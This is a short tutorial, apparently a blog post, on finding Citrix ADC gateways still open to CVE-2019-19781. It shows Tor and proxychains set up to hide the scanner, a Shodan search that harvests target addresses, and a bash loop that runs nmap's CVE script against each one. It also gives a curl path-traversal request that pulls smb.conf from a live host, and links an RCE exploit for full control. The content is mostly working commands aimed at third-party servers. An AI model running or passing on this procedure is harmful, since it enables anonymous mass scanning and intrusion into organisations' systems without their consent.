Hi, I want to show you how easy it is to find a vulnerable server on the internet. 
Okey guys, so now, firstly we need to have some TOR client for anonymity ;) 
Before we begin, look at the following tools
- [tor](https://www.torproject.org/download/tor/)
- [nyx](https://nyx.torproject.org/)
- [proxychains-ng](https://github.com/rofl0r/proxychains-ng)
- [shodan](https://cli.shodan.io/)
- [curl](https://curl.haxx.se/)
- [nmap](https://nmap.org/)

```bash
$ tor &
$ nyx -i 127.0.0.1:9052
```

Then we can test, if the tor is working correctly with __proxychains__
```bash
$ proxychains curl ifconfig.me
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  ifconfig.me:80  ...  OK
46.166.139.111
```

Run shodan to get all open services which look like Citrix ADC Gateway
```bash
$ proxychains -q shodan search --fields="ip_str,port" citrix netscaler > $HOME/citrix_list
```

Now we will prepare a script that scans the vulnerability __CVE-2019-19781__ in these services
```bash
#!/bin/bash

CITRIX_IP_LIST="$HOME/citrix_list"

while read CITRIX_IP_PORT; do
          IP=$(echo $CITRIX_IP_PORT | awk '{print $1}')
        PORT=$(echo $CITRIX_IP_PORT | awk '{print $2}')
        proxychains -q nmap -p $PORT -sV --script CVE-2019-19781 $IP
done < $CITRIX_IP_LIST
```

After a short moment we get some interesting results. There are still servers with this vulnerability present.

We can verify the vulnerability by using __curl__.
```bash
$ proxychains -q curl -k --path-as-is https://<host>:<port>/vpn/../vpns/cfg/smb.conf  && echo -e
[global]
        encrypt passwords = yes
        name resolve order = lmhosts wins host bcast
```

And that’s it. :) We will not continue from this point, but there exists a [RCE exploit](https://www.exploit-db.com/exploits/47902) that enables the user to gain full control.
